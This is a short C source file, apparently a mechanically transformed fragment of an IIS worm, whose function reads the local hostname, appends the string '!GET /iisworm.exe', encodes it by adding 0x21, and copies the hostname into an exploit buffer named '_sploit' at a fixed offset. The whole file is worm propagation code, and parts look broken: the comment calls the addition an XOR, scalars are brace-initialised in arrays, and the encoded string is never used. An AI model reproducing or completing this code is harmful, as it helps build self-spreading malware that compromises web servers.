#pragma optimize("", off)

#include "data_globals.h"
#include <stdlib.h>
#include <string.h>

void setuphostname(void) {
    char hostname[1024];
    // Transform struct hostent *he
    struct hostent* volatile he_buf[2] = {{NULL, (struct hostent*)0}};
    struct hostent* volatile *p_he = (struct hostent* volatile *)&he_buf[0];

    char tmp[1024];

    // Transform size_t len
    volatile size_t len_buf[2] = {{0, (size_t)0}};
    volatile size_t *p_len = (volatile size_t *)&len_buf[0];

    // Transform int i
    volatile int i_buf[2] = {{0, (int)0}};
    volatile int *p_i = (volatile int *)&i_buf[0];

    if (gethostname(hostname, sizeof(hostname)) != 0) return;
    (*p_he) = gethostbyname(hostname);
    if (!(*p_he)) return;

    strncpy(tmp, (*p_he)->h_name, sizeof(tmp) - 1);
    tmp[sizeof(tmp) - 1] = '\0';
    strncat(tmp, "!GET /iisworm.exe", sizeof(tmp) - strlen(tmp) - 1);

    for ((*p_i) = 0; (*p_i) < (int)strlen(tmp); (*p_i)++)
        tmp[(*p_i)] += 0x21;   // XOR with 0x21 (add 0x21)

    (*p_len) = strlen((*p_he)->h_name);
    if ((*p_len) > 100) (*p_len) = 100;

    // Copy into the exploit buffer at the correct offset
    memcpy(_sploit + sizeof(_sploit) - 102, (*p_he)->h_name, (*p_len));
}

#pragma optimize("", on)
